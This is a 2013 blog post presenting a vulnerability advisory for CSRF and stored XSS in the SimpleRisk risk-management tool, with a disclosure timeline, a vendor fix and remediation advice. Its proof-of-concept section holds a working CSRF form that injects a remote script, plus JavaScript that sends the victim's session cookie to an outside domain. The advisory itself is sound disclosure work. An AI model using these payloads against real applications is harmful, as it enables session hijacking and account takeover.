---
layout: post
status: publish
published: true
title: SimpleRisk v.20130915-01 CSRF-XSS Account Compromise
author:
  display_name: ethicalhack3r
  login: ethicalhack3r
  email: ryandewhurst@gmail.com
  url: ''
author_login: ethicalhack3r
author_email: ryandewhurst@gmail.com
excerpt: "1. *Advisory Information*\r\n\r\nTitle: SimpleRisk v.20130915-01 CSRF-XSS
  Account Compromise\r\nAdvisory ID: RS-2013-0001\r\nDate Published: 2013-09-30\r\n\r\n2.
  *Vulnerability Information*\r\n\r\nType: Cross-Site Request Forgery (CSRF) [CWE-352,
  OWASP-A8], Cross-Site Scripting (XSS) [CWE-79, OWASP-A3]\r\nImpact: Full Account
  Compromise\r\nRemotely Exploitable: Yes\r\nLocally Exploitable: Yes\r\nSeverity:
  High\r\nCVE-ID: CVE-2013-5748 (CSRF) and CVE-2013-5749 (non-httponly cookie)\r\n\r\n3.
  *Software Description*\r\n\r\nSimpleRisk a simple and free tool to perform risk
  management activities. Based entirely on open source technologies and sporting a
  Mozilla Public License 2.0, a SimpleRisk instance can be stood up in minutes and
  instantly provides the security professional with the ability to submit risks, plan
  mitigations, facilitate management reviews, prioritize for project planning, and
  track regular reviews. It is highly configurable and includes dynamic reporting
  and the ability to tweak risk formulas on the fly. It is under active development
  with new features being added all the time. SimpleRisk is truly Enterprise Risk
  Management simplified. [0]\r\n\r\nHomepage: <a href=\"http://www.simplerisk.org/\">http://www.simplerisk.org/</a>\r\nDownload:
  <a href=\"https://simplerisk.googlecode.com/files/simplerisk-20130915-001.tgz\">https://simplerisk.googlecode.com/files/simplerisk-20130915-001.tgz</a>\r\n\r\n"
wordpress_id: 17200
wordpress_url: http://www.ethicalhack3r.co.uk/?p=17200
date: '2013-09-30 22:15:12 +0100'
date_gmt: '2013-09-30 21:15:12 +0100'
---
<p>1. *Advisory Information*</p>
<p>Title: SimpleRisk v.20130915-01 CSRF-XSS Account Compromise<br />
Advisory ID: RS-2013-0001<br />
Date Published: 2013-09-30</p>
<p>2. *Vulnerability Information*</p>
<p>Type: Cross-Site Request Forgery (CSRF) [CWE-352, OWASP-A8], Cross-Site Scripting (XSS) [CWE-79, OWASP-A3]<br />
Impact: Full Account Compromise<br />
Remotely Exploitable: Yes<br />
Locally Exploitable: Yes<br />
Severity: High<br />
CVE-ID: CVE-2013-5748 (CSRF) and CVE-2013-5749 (non-httponly cookie)</p>
<p>3. *Software Description*</p>
<p>SimpleRisk a simple and free tool to perform risk management activities. Based entirely on open source technologies and sporting a Mozilla Public License 2.0, a SimpleRisk instance can be stood up in minutes and instantly provides the security professional with the ability to submit risks, plan mitigations, facilitate management reviews, prioritize for project planning, and track regular reviews. It is highly configurable and includes dynamic reporting and the ability to tweak risk formulas on the fly. It is under active development with new features being added all the time. SimpleRisk is truly Enterprise Risk Management simplified. [0]</p>
<p>Homepage: <a href="http://www.simplerisk.org/">http://www.simplerisk.org/</a><br />
Download: <a href="https://simplerisk.googlecode.com/files/simplerisk-20130915-001.tgz">https://simplerisk.googlecode.com/files/simplerisk-20130915-001.tgz</a></p>
<p><a id="more"></a><a id="more-17200"></a></p>
<p>4. *Vulnerability Description*</p>
<p>Cross-Site Request Forgery (CSRF) and Stored Cross-Site Scripting (XSS) have been discovered within SimpleRisk version 20130915-01 leading to complete account compromise. The CSRF vulnerability is used to deliver the XSS payload which accesses the authenticated user's session cookies and transmits them to a third-party domain under the attacker's control. Once the attacker has the user's session cookie, the attacker can authenticate to the application as the user.</p>
<p>5. *Vulnerable Packages*</p>
<p>Only version 20130915-01 was tested which was the latest version at the time of writing.</p>
<p>6. *Vendor Information, Solutions and Workarounds*</p>
<p>SimpleRisk released version 20130916-001 to address the issue.</p>
<p>7. *Credits*</p>
<p>These vulnerabilities were discovered by Ryan Dewhurst - <a href="http://www.randomstorm.com/">http://www.randomstorm.com/</a> - <a href="http://www.dewhurstsecurity.com/">http://www.dewhurstsecurity.com/</a></p>
<p>8. *Proof of Concept (PoC)*</p>
<p>8.1 *Cross-Site Request Forgery (CSRF)*</p>
<p>The following CSRF PoC submits a POST request to the prioritize_planning.php page with the XSS payload within the new_project parameter.</p>
<p>[code]<br />
&lt;html&gt;<br />
  &lt;body&gt;<br />
    &lt;form action=&quot;http://127.0.0.1/simplerisk/management/prioritize_planning.php&quot; method=&quot;POST&quot;&gt;<br />
      &lt;input type=&quot;hidden&quot; name=&quot;new&amp;#95;project&quot; value=&quot;&amp;lt;script&amp;#32;src&amp;#61;&amp;#47;&amp;#47;ethicalhack3r&amp;#46;co&amp;#46;uk&amp;#47;files&amp;#47;xss&amp;#47;c&amp;#46;j&amp;gt;&amp;lt;&amp;#47;script&amp;gt;&quot; /&gt;<br />
      &lt;input type=&quot;hidden&quot; name=&quot;add&amp;#95;project&quot; value=&quot;Add&quot; /&gt;<br />
      &lt;input type=&quot;hidden&quot; name=&quot;projects&quot; value=&quot;&quot; /&gt;<br />
      &lt;input type=&quot;submit&quot; value=&quot;Submit request&quot; /&gt;<br />
    &lt;/form&gt;<br />
  &lt;/body&gt;<br />
&lt;/html&gt;<br />
[/code]</p>
<p>8.2 *Stored Cross-Site Scripting (XSS)*</p>
<p>The prioritize_planning.php page accepts user supplied input via the new_project POST parameter and then later outputs that data to the page without first being sanitised or encoded. The following code was used to inject JavaScript into the application's back-end database.</p>
<p>Payload: &lt;script src=//ethicalhack3r.co.uk/files/xss/c.j&gt;&lt;/script&gt;<br />
Method: POST<br />
Parameter: new_project</p>
<p>The c.j JavaScript file contained the following code which sends the user's authenticated session cookie to a third-party domain:</p>
<p>document.write('&lt;img src=//ethicalhack3r.co.uk/srx=' + document.cookie + '&gt;');</p>
<p>9. *Remediation*</p>
<p>9.1 *Cross-Site Request Forgery (CSRF)*</p>
<p>Set per page anti-csrf tokens (nonces) which are submitted with requests and then validated by the server. Please refer to OWASP's CSRF Prevention Cheat Sheet for further information. [1]</p>
<p>9.2 *Cross-Site Scripting (XSS)*</p>
<p>Properly sanitise and encode user supplied input and output. Please refer to OWASP's XSS Prevention Cheat Sheet for further information. [2]</p>
<p>9.3 *Other Recommendations*</p>
<p>. Add the httponly flag to the session cookie so that JavaScript's document.cookie can not access it. [3]<br />
. Set the Content Security Policy (CSP) header to whitelist where JavaScript is allowed to be loaded from. [4]<br />
. Set the X-XSS-Protection header to ensure the browser's XSS filtering is enabled. (only works for reflected XSS) [5]</p>
<p>10. *Report Timeline*</p>
<p>2013-09-16: SimpleRisk notified of issue.<br />
2013-09-16: SimpleRisk acknoledged issue.<br />
2013-09-16: SimpleRisk release new version.<br />
2013-09-30: Advisory released.</p>
<p>11. *References*</p>
<p>[0] <a href="http://www.simplerisk.org/">http://www.simplerisk.org/</a><br />
[1] <a href="https://www.owasp.org/index.php/Cross-Site_Request_Forgery_(CSRF)_Prevention_Cheat_Sheet">https://www.owasp.org/index.php/Cross-Site_Request_Forgery_(CSRF)_Prevention_Cheat_Sheet</a><br />
[2] <a href="https://www.owasp.org/index.php/XSS_(Cross_Site_Scripting)_Prevention_Cheat_Sheet">https://www.owasp.org/index.php/XSS_(Cross_Site_Scripting)_Prevention_Cheat_Sheet</a><br />
[3] <a href="https://www.owasp.org/index.php/HttpOnly">https://www.owasp.org/index.php/HttpOnly</a><br />
[4] <a href="https://www.owasp.org/index.php/Content_Security_Policy">https://www.owasp.org/index.php/Content_Security_Policy</a><br />
[5] <a href="https://www.owasp.org/index.php/HTML5_Security_Cheat_Sheet#X-XSS-Protection">https://www.owasp.org/index.php/HTML5_Security_Cheat_Sheet#X-XSS-Protection</a><br />
[6] <a href="http://www.randomstorm.com/">http://www.randomstorm.com/</a><br />
[7] <a href="http://www.dewhurstsecurity.com/">http://www.dewhurstsecurity.com/</a></p>
